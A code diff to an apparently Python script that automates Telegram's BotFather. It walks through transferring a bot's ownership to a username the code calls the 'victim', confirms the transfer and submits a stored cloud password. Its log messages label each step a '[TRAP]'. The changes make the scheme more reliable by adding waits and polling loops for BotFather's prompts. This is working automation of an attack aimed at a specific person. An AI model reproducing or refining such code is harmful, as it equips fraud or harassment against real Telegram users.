@@ -258,7 +258,7 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
 
         # /mybots
         await client.send_message(bf, "/mybots")
-        await asyncio.sleep(2)
+        await asyncio.sleep(3)
 
         # Нажимаем на кнопку с нашим ботом
         messages = await client.get_messages(bf, limit=3)
@@ -268,7 +268,7 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
                     for btn in row:
                         if bot_username.lower() in btn.text.lower():
                             await btn.click()
-                            await asyncio.sleep(2)
+                            await asyncio.sleep(3)
                             break
 
         # Transfer ownership
@@ -279,7 +279,7 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
                     for btn in row:
                         if "transfer" in btn.text.lower() or "Transfer" in btn.text:
                             await btn.click()
-                            await asyncio.sleep(2)
+                            await asyncio.sleep(3)
                             break
 
         # Нажимаем кнопку подтверждения намерения
@@ -288,15 +288,38 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
             if msg.buttons:
                 for row in msg.buttons:
                     for btn in row:
-                        # Кнопка "I want to transfer my bot"
                         if "transfer" in btn.text.lower() or "want" in btn.text.lower():
                             await btn.click()
-                            await asyncio.sleep(2)
+                            await asyncio.sleep(3)
                             break
+
+        # Ждём сообщения "Please share the new owner's contact or their username"
+        for _ in range(10):
+            messages = await client.get_messages(bf, limit=3)
+            for msg in messages:
+                if msg.text and ("share" in msg.text.lower() or "username" in msg.text.lower() or "owner" in msg.text.lower()):
+                    print(f"[TRAP] BotFather готов принять username жертвы", flush=True)
+                    break
+            else:
+                await asyncio.sleep(2)
+                continue
+            break
 
         # Вводим username жертвы
         await client.send_message(bf, f"@{victim}")
-        await asyncio.sleep(2)
+        await asyncio.sleep(3)
+
+        # Ждём сообщения с подтверждением (Yes/proceed)
+        for _ in range(10):
+            messages = await client.get_messages(bf, limit=3)
+            for msg in messages:
+                if msg.text and ("about to transfer" in msg.text.lower() or "proceed" in msg.text.lower() or "sure" in msg.text.lower()):
+                    print(f"[TRAP] BotFather готов к подтверждению", flush=True)
+                    break
+            else:
+                await asyncio.sleep(2)
+                continue
+            break
 
         # Подтверждаем передачу (кнопка Yes)
         messages = await client.get_messages(bf, limit=3)
@@ -307,12 +330,15 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
                     for btn in row:
                         if "yes" in btn.text.lower() or "proceed" in btn.text.lower():
                             await btn.click()
-                            await asyncio.sleep(2)
+                            await asyncio.sleep(3)
                             break
+
+        # Ждём запроса пароля
+        await asyncio.sleep(2)
 
         # Вводим облачный пароль
         await client.send_message(bf, CLOUD_PASS)
-        await asyncio.sleep(3)
+        await asyncio.sleep(5)
 
         # Проверяем успех — ищем "It worked!"
         messages = await client.get_messages(bf, limit=5)
